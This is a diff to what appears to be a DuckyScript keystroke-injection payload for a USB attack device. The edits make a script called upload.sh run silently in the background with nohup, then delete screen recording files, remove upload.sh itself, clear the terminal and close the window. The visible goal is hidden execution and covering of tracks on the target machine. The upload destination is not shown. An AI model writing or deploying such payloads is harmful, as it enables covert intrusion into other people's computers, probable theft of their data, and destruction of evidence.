@@ -47,20 +47,28 @@ DELAY 500
 STRING chmod +x upload.sh
 ENTER
 DELAY 500
-STRING ./upload.sh
+STRING nohup ./upload.sh >/dev/null 2>&1 &
+DELAY 500
 ENTER
-DELAY 5000
+DELAY 10000
+STRING rm ~/Desktop/screen_recording.mkv
+DELAY 250
+ENTER
+DELAY 3000
 STRING rm ~/Desktop/screen_recording.mp4
 DELAY 250
 ENTER
 DELAY 500
-STRING rm ~/Desktop/screen_recording.mkv
-DELAY 250
+STRING rm upload.sh
+DELAY 500
 ENTER
+DELAY 500
 STRING clear
 ENTER
 DELAY 500
-GUI h
+GUI w
+DELAY 1000 
+ENTER
 
 
 
